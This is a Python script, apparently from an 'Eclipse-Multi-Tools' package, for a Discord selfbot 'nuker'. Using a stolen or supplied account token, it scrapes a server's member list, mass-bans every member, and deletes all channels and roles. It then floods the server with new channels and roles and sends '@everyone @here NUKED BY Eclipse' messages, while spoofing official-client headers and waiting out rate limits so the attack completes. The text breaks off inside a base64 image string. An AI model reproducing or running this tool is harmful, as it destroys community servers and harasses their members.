▓██▒  ▐▌██▒▓▓█  ░██░ ▓██ █▄ ▒▓█  ▄▒██▀▀█▄  
▒██░   ▓██░▒▒█████▓  ▒██▒ █▄░▒████░██▓ ▒██▒
░ ▒░   ▒ ▒  ▒▓▒ ▒ ▒  ▒ ▒▒ ▓▒░░ ▒░ ░ ▒▓ ░▒▓░
░ ░░   ░ ▒░ ░▒░ ░ ░  ░ ░▒ ▒░ ░ ░    ░▒ ░ ▒░
   ░   ░ ░   ░░ ░ ░  ░ ░░ ░    ░     ░   ░ 
         ░    ░      ░  ░      ░     ░     

    ''')
    token = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Account Token: ''')
    server = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Server ID: ''')
    chann = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Any Channel ID: ''')


    intents = discord.Intents.all()
    intents.members = True

    headerrs = {'Authorization': f'{token}',
                "accept": "*/*",
                'origin': 'https://discord.com',
                'sec - fetch - mode': 'cors',
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                'sec - fetch - site': 'same - origin',
                'x - debug - options': 'bugReporterEnabled',
                'x - super - properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAyMTEzLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ =='
                }
    client = commands.Bot(command_prefix="!", case_insensitive=False, self_bot=True, intents=intents)

    def BanAll():
        with open('data/Member_id.txt') as memberss:
            for line in memberss:
                r = requests.put(f'https://discord.com/api/v9/guilds/{server}/bans/{line}', headers=headerrs)
                if r.status_code == 200 or 204:
                    print(f"{Fore.LIGHTRED_EX}[+]{Fore.RESET} Banned {line} ")
                else:
                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant ban members') 
    class UNuker:
        def DeleteChannels(self, guild, channel):
            while True:
                r = requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headerrs)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(
                            f"{Fore.LIGHTRED_EX}[+] {Fore.RESET}Deleted Channel {channel}")
                        break
                    else:
                        break

        def DeleteRoles(self, guild, role):
            while True:
                r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}",
                                    headers=headerrs)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(
                            f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Deleted Role {role}")
                        break
                    else:
                        break

        async def Scrape(self):
            await client.wait_until_ready()
            guildOBJ = client.get_guild(int(server))

            channelcount = 0
            with open('data/channels.txt', 'w') as c:
                for channel in guildOBJ.channels:
                    c.write(str(channel.id) + "\n")
                    channelcount += 1
                c.close()

            bot = discum.Client(token=token)

            def closefetching(resp,guildid):
                if bot.gateway.finishedMemberFetching(guildid):
                    lenmembersfetched = len(bot.gateway.session.guild(guildid).members)
                    print(str(lenmembersfetched))
                    bot.gateway.removeCommand({'function':closefetching, 'params':{'guildid':guildid}})
                    bot.gateway.close()

            def getmembers(guildid,channelid):
                bot.gateway.fetchMembers(guildid, channelid, keep='all',wait=1)
                bot.gateway.command({'function':closefetching,'params':{'guildid':guildid}})
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guildid).members

            members = getmembers(server, chann)

            global memberids
            memberids = []

            for memberId in members:
                memberids.append(memberId)

            with open('data/Member_id.txt','w') as ids:
                for element in memberids:
                    ids.write(element + '\n')  

            rolecount = 0
            with open('data/roles.txt', 'w') as r:
                for role in guildOBJ.roles:
                    r.write(str(role.id) + "\n")
                    rolecount += 1
                r.close()


        def SpamChannels(self, guild, name):
            while True:
                json = {'name': name, 'type': 0}
                r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headerrs, json=json)

                id = r.json()["id"]

                def sendmessage():
                    e = requests.post(f'https://discord.com/api/v9/channels/{id}/messages',headers=headerrs, json={'content':'@everyone @here NUKED BY Eclipse'})
                    if 'retry_after' in e.text:
                        ratelimittime = round(e.json()["retry_after"])
                        time.sleep(ratelimittime)

                sendmessage()

                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(f"{Fore.LIGHTRED_EX}[+]{Fore.RESET} Created Channel ")
                        break
                    else:
                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant create channels')



        def SpamRoles(self, guild, name):
            while True:
                json = {'name': name}
                r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/roles', headers=headerrs,
                                    json=json)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(f"{Fore.LIGHTRED_EX}[+]{Fore.RESET} Created Role ")
                        break
                    else:
                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant create roles')
                        break

        async def NukeStart(self):
            cls()
            chh = 'nuked-by-eclipse-multi-tools'
            cha = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Channel Amount: ''')
            rn = 'NUKED BY Eclipse-Multi-Tools'
            ra = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Role Amount: ''')

            print('CAUTION!, There is a high likely hood of your account being locked if you do not have phone verification!')
            time.sleep(5)
            os.system('pause')
            BanAll()

            url = f'https://discord.com/api/v9/guilds/{server}'

            image = "data:image/jpg;base64,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